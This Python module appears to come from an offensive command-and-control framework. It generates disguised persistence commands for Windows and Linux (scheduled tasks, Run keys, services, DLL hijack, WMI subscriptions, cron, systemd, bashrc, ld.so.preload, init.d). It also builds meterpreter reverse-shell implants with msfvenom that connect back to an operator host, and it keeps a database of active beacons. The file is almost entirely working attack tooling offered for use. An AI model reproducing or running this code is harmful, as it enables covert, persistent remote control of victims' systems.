"""
ImplantManager — Module 6.

Generates persistence commands, full implants, and manages beacons in the DB.
All external tool calls use asyncio.create_subprocess_exec.
Tools are checked with shutil.which() before invocation.
"""
from __future__ import annotations

import asyncio
import json
import shutil
import uuid
import logging
from datetime import datetime
from typing import Optional

logger = logging.getLogger(__name__)


# ── Helpers ────────────────────────────────────────────────────────────────────

async def _run(cmd: list[str], timeout: int = 120) -> tuple[str, bool]:
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
        )
        try:
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return stdout.decode("utf-8", errors="replace"), proc.returncode == 0
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return f"[TIMEOUT] {cmd[0]} exceeded {timeout}s", False
    except FileNotFoundError:
        return f"[NOT_FOUND] {cmd[0]}", False
    except Exception as exc:
        return str(exc), False


# ── ImplantManager ─────────────────────────────────────────────────────────────

class ImplantManager:
    """
    Persistence command generator, implant builder, and beacon registry.
    """

    # ── Persistence ────────────────────────────────────────────────────────────

    async def generate_persistence(
        self,
        os_type: str,
        method: str,
        payload_path: str,
        interval: int = 0,
    ) -> dict:
        """
        Generate persistence commands for the target OS.

        Windows methods: scheduled_task | registry_run | service | dll_hijack
        Linux methods:   crontab | systemd | bashrc | ld_preload
        """
        os_type = os_type.lower()

        if "win" in os_type:
            return self._windows_persistence(method, payload_path, interval)
        elif "linux" in os_type or "unix" in os_type:
            return self._linux_persistence(method, payload_path, interval)
        else:
            return {
                "success": False,
                "error": f"Unsupported OS type: {os_type}",
                "supported": ["windows", "linux"],
            }

    def _windows_persistence(self, method: str, payload_path: str, interval: int) -> dict:
        """Windows persistence command generator."""
        name = "WindowsUpdateHelper"

        if method == "scheduled_task":
            trigger = f"/sc MINUTE /mo {max(interval, 1)}" if interval else "/sc ONLOGON"
            commands = [
                f'schtasks /create /tn "{name}" /tr "{payload_path}" {trigger} /ru SYSTEM /f',
                f'schtasks /query /tn "{name}"',
            ]
            cleanup = [f'schtasks /delete /tn "{name}" /f']

        elif method == "registry_run":
            commands = [
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{name}" /t REG_SZ /d "{payload_path}" /f',
                f'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{name}" /t REG_SZ /d "{payload_path}" /f',
            ]
            cleanup = [
                f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{name}" /f',
                f'reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{name}" /f',
            ]

        elif method == "service":
            commands = [
                f'sc create "{name}" binPath= "{payload_path}" start= auto',
                f'sc description "{name}" "Windows Update Helper Service"',
                f'sc start "{name}"',
            ]
            cleanup = [
                f'sc stop "{name}"',
                f'sc delete "{name}"',
            ]

        elif method == "dll_hijack":
            # Example: hijack a DLL loaded by a trusted process
            hijack_dir = "C:\\Program Files\\WindowsApps"
            commands = [
                f"# Copy malicious DLL to hijack location",
                f'copy "{payload_path}" "{hijack_dir}\\version.dll"',
                f"# DLL hijack will trigger on next process start",
                f"# Monitor: procmon /filter DLL /target {hijack_dir}",
            ]
            cleanup = [f'del "{hijack_dir}\\version.dll"']

        elif method == "wmi_subscription":
            filter_name = f"{name}Filter"
            consumer_name = f"{name}Consumer"
            commands = [
                f'$filter = ([wmiclass]"\\\\.\root\\subscription:__EventFilter").CreateInstance()',
                f'$filter.Name = "{filter_name}"',
                f'$filter.QueryLanguage = "WQL"',
                f'$filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_LocalTime\'"',
                f'$filter.Put()',
                f'$consumer = ([wmiclass]"\\\\.\root\\subscription:CommandLineEventConsumer").CreateInstance()',
                f'$consumer.Name = "{consumer_name}"',
                f'$consumer.CommandLineTemplate = "{payload_path}"',
                f'$consumer.Put()',
                f'$binding = ([wmiclass]"\\\\.\root\\subscription:__FilterToConsumerBinding").CreateInstance()',
                f'$binding.Filter = $filter.Path_.Path',
                f'$binding.Consumer = $consumer.Path_.Path',
                f'$binding.Put()',
            ]
            cleanup = [
                f'Get-WMIObject -Namespace root\\subscription -Class __EventFilter -Filter \'Name="{filter_name}"\' | Remove-WMIObject',
                f'Get-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter \'Name="{consumer_name}"\' | Remove-WMIObject',
            ]

        else:
            return {"success": False, "error": f"Unknown Windows persistence method: {method}"}

        return {
            "success": True,
            "os": "windows",
            "method": method,
            "payload_path": payload_path,
            "commands": commands,
            "cleanup": cleanup,
            "notes": f"Run as Administrator for system-level persistence. Method: {method}",
        }

    def _linux_persistence(self, method: str, payload_path: str, interval: int) -> dict:
        """Linux persistence command generator."""
        name = "system-health-monitor"
        user = "$(whoami)"

        if method == "crontab":
            cron_interval = f"*/{max(interval // 60, 1)} * * * *" if interval >= 60 else "* * * * *"
            commands = [
                f'(crontab -l 2>/dev/null; echo "{cron_interval} {payload_path}") | crontab -',
                "crontab -l  # verify",
            ]
            cleanup = [
                f'crontab -l | grep -v "{payload_path}" | crontab -',
            ]

        elif method == "systemd":
            service_content = (
                f"[Unit]\n"
                f"Description=System Health Monitor\n"
                f"After=network.target\n\n"
                f"[Service]\n"
                f"Type=simple\n"
                f"ExecStart={payload_path}\n"
                f"Restart=always\n"
                f"RestartSec={max(interval, 30)}\n\n"
                f"[Install]\n"
                f"WantedBy=multi-user.target\n"
            )
            commands = [
                f"# Write service file",
                f"cat > /etc/systemd/system/{name}.service << 'EOF'\n{service_content}EOF",
                f"systemctl daemon-reload",
                f"systemctl enable {name}.service",
                f"systemctl start {name}.service",
                f"systemctl status {name}.service",
            ]
            cleanup = [
                f"systemctl stop {name}.service",
                f"systemctl disable {name}.service",
                f"rm /etc/systemd/system/{name}.service",
                f"systemctl daemon-reload",
            ]

        elif method == "bashrc":
            commands = [
                f'echo "nohup {payload_path} &>/dev/null &" >> ~/.bashrc',
                f'echo "nohup {payload_path} &>/dev/null &" >> ~/.profile',
                f'echo "nohup {payload_path} &>/dev/null &" >> ~/.bash_profile',
            ]
            cleanup = [
                f'sed -i \'/{payload_path.replace("/", "\\/")}$/d\' ~/.bashrc ~/.profile ~/.bash_profile',
            ]

        elif method == "ld_preload":
            so_path = f"/tmp/.lib{uuid.uuid4().hex[:8]}.so"
            commands = [
                f"# Compile malicious shared library",
                f"gcc -shared -fPIC -o {so_path} implant.c",
                f"chmod +x {so_path}",
                f"# Set LD_PRELOAD system-wide",
                f'echo "{so_path}" >> /etc/ld.so.preload',
                f"# OR per-user (less privileged)",
                f'echo "export LD_PRELOAD={so_path}" >> ~/.bashrc',
            ]
            cleanup = [
                f'sed -i \'/{so_path.replace("/", "\\/")}$/d\' /etc/ld.so.preload',
                f"rm {so_path}",
            ]

        elif method == "init_d":
            init_script = (
                f"#!/bin/bash\n"
                f"### BEGIN INIT INFO\n"
                f"# Provides:          {name}\n"
                f"# Required-Start:    $remote_fs $syslog\n"
                f"# Required-Stop:     $remote_fs $syslog\n"
                f"# Default-Start:     2 3 4 5\n"
                f"# Default-Stop:      0 1 6\n"
                f"# Short-Description: System health monitor\n"
                f"### END INIT INFO\n\n"
                f"case \"$1\" in\n"
                f"  start) nohup {payload_path} &>/dev/null & ;;\n"
                f"  stop)  pkill -f '{payload_path}' ;;\n"
                f"esac\n"
            )
            commands = [
                f"cat > /etc/init.d/{name} << 'EOF'\n{init_script}EOF",
                f"chmod +x /etc/init.d/{name}",
                f"update-rc.d {name} defaults",
                f"service {name} start",
            ]
            cleanup = [
                f"service {name} stop",
                f"update-rc.d -f {name} remove",
                f"rm /etc/init.d/{name}",
            ]

        else:
            return {"success": False, "error": f"Unknown Linux persistence method: {method}"}

        return {
            "success": True,
            "os": "linux",
            "method": method,
            "payload_path": payload_path,
            "commands": commands,
            "cleanup": cleanup,
            "notes": f"Root privileges may be required for {method}. Method: {method}",
        }

    # ── Full implant generation ────────────────────────────────────────────────

    async def generate_implant(
        self,
        os_type: str,
        protocol: str,
        lhost: str,
        lport: int,
        persistence_method: str,
    ) -> dict:
        """
        Generate a full implant: msfvenom payload + persistence commands.
        """
        if not shutil.which("msfvenom"):
            return {"available": False, "error": "tool_not_found", "tool": "msfvenom"}

        os_lower = os_type.lower()

        # Select payload based on OS + protocol
        if "win" in os_lower:
            if protocol == "https":
                payload = "windows/x64/meterpreter/reverse_https"
                fmt = "exe"
                ext = ".exe"
            elif protocol == "dns":
                payload = "windows/x64/meterpreter_reverse_dns"
                fmt = "exe"
                ext = ".exe"
            else:
                payload = "windows/x64/meterpreter/reverse_tcp"
                fmt = "exe"
                ext = ".exe"
        else:
            if protocol == "https":
                payload = "linux/x64/meterpreter_reverse_https"
                fmt = "elf"
                ext = ".elf"
            elif protocol == "dns":
                payload = "linux/x64/meterpreter_reverse_dns"
                fmt = "elf"
                ext = ".elf"
            else:
                payload = "linux/x64/meterpreter/reverse_tcp"
                fmt = "elf"
                ext = ".elf"

        # Suggested output path
        implant_name = f"implant_{uuid.uuid4().hex[:8]}{ext}"
        output_path = f"/tmp/{implant_name}"

        # Build msfvenom command
        msf_cmd = [
            "msfvenom",
            "-p", payload,
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", fmt,
            "-o", output_path,
        ]

        out, ok = await _run(msf_cmd, timeout=120)

        # Generate persistence
        persistence = await self.generate_persistence(
            os_type=os_type,
            method=persistence_method,
            payload_path=output_path,
        )

        # Build MSF handler resource script
        handler_rc = (
            f"use exploit/multi/handler\n"
            f"set payload {payload}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            f"set ExitOnSession false\n"
            f"run -j\n"
        )

        return {
            "available": True,
            "success": ok,
            "os_type": os_type,
            "protocol": protocol,
            "payload": payload,
            "format": fmt,
            "lhost": lhost,
            "lport": lport,
            "output_path": output_path,
            "msfvenom_command": " ".join(msf_cmd),
            "msfvenom_output": out[:500],
            "persistence": persistence,
            "msf_handler": handler_rc,
            "notes": (
                f"1. Copy {output_path} to target\n"
                f"2. Start MSF handler (see msf_handler)\n"
                f"3. Execute persistence commands on target\n"
            ),
        }

    # ── Active sessions ────────────────────────────────────────────────────────

    async def list_active_sessions(self) -> list:
        """List active beacons from the database."""
        try:
            from database.db import SessionLocal
            from database.models import ImplantBeacon
            with SessionLocal() as db:
                beacons = (
                    db.query(ImplantBeacon)
                    .filter(ImplantBeacon.status == "active")
                    .order_by(ImplantBeacon.last_seen.desc())
                    .all()
                )
                return [
                    {
                        "beacon_id": b.beacon_id,
                        "hostname": b.hostname,
                        "ip": b.ip,
                        "os_type": b.os_type,
                        "arch": b.arch,
                        "privilege": b.privilege,
                        "protocol": b.protocol,
                        "status": b.status,
                        "last_seen": b.last_seen.isoformat() if b.last_seen else None,
                        "first_seen": b.first_seen.isoformat() if b.first_seen else None,
                        "c2_host": b.c2_host,
                        "c2_port": b.c2_port,
                        "tags": b.tags or [],
                        "notes": b.notes,
                    }
                    for b in beacons
                ]
        except Exception as exc:
            logger.error("list_active_sessions error: %s", exc)
            return []

    # ── Register beacon ────────────────────────────────────────────────────────

    async def register_beacon(
        self,
        hostname: str,
        ip: str,
        os: str,
        arch: str,
        privilege: str,
        protocol: str,
        c2_host: str = "",
        c2_port: int = 0,
        tags: list = None,
        notes: str = "",
    ) -> str:
        """Register a new beacon in the database and return its beacon_id."""
        beacon_id = str(uuid.uuid4())
        try:
            from database.db import SessionLocal
            from database.models import ImplantBeacon
            with SessionLocal() as db:
                beacon = ImplantBeacon(
                    beacon_id=beacon_id,
                    hostname=hostname,
                    ip=ip,
                    os_type=os,
                    arch=arch,
                    privilege=privilege,
                    protocol=protocol,
                    status="active",
                    last_seen=datetime.utcnow(),
                    first_seen=datetime.utcnow(),
                    c2_host=c2_host,
                    c2_port=c2_port,
                    tags=tags or [],
                    notes=notes,
                )
                db.add(beacon)
                db.commit()
                logger.info("Beacon registered: %s @ %s (%s)", beacon_id, hostname, ip)
        except Exception as exc:
            logger.error("register_beacon error: %s", exc)
        return beacon_id
